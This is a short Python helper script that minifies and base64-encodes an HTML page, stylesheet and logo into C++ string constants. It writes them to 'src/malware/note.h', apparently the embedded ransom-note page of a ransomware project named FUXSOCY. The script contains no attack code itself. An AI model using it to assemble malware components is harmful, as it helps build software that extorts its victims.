#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import base64
import htmlmin

# Generate note.h from HTML/CSS and place it under src/

def minify_html(filename: str) -> str:
    """ Read the HTML, minify it, and return the minified content. """
    with open(filename) as fin:
        return htmlmin.minify(fin.read(), remove_empty_space=True).replace('\n', '')

def b64encode_html(filename: str) -> str:
    """ minify and b64encode the given html file """
    return str(base64.b64encode(str.encode(minify_html(filename))))[2:][:-1]

def b64encode_file(filename: str) -> str:
    """ b64encode the given file """
    with open(filename, 'rb') as fin:
        return str(base64.b64encode(fin.read()))[2:][:-1]

def generate_string_dcl_lines(name: str, b64: str) -> str:
    """ generate line(s) that declare the specified string variable.
    If the content of the string (b64) >= 2950 chars, it will be splitted
    into multiple lines every 2950 chars.
    """
    n = 2950 # split every 2950 chars
    return 'const std::string ' + name + ' = ' + '\n'.join(['"' + b64[i:i+n] + '"' for i in range(0, len(b64), n)]) + ';\n'


if __name__ == '__main__':
    files_to_encode = ['pages/index.html', 'pages/styles.css', 'pages/logo.png']
    b64encoded = []

    for filename in files_to_encode:
        if '.html' in filename:
            b64encoded.append(b64encode_html(filename))
        else:
            b64encoded.append(b64encode_file(filename))

    
    content_part1 = [
        '#ifndef FUXSOCY_NOTE_H_',
        '#define FUXSOCY_NOTE_H_',
        '',
        '#include <string>',
        '',
        'namespace note {',
        ''
    ]
    content_part2 = [
        '',
        '} // namespace note',
        '',
        '#endif // FUXSOCY_NOTE_H_'
    ]

    with open('src/malware/note.h', 'w') as fout:
        fout.write('\n'.join(content_part1))
        fout.write(generate_string_dcl_lines('html', b64encoded[0]))
        fout.write(generate_string_dcl_lines('css', b64encoded[1]))
        fout.write(generate_string_dcl_lines('logo', b64encoded[2]))
        fout.write('\n'.join(content_part2))
